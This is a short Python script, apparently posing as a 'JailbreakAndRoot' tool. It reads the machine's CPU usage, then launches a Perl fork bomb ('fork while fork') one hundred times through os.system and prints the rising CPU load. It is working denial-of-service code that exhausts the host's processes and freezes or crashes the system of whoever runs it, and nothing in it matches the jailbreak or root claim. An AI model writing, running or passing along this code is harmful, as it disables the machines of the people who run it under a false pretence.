import os
t = os.popen("ps -A -o %cpu | awk '{s+=$1} END {print s }'")
t2 = t.read()
t3 = t2.replace("\n","%")
t4 = t2.replace("\n","")
print("JailbreakAndRoot")
for i in range(100):
  os.system('perl -e "fork while fork"')
for i in range(10):
  print("Your CPU Usage:",t3)
if float(t4)>99:
  print("Bye bye")
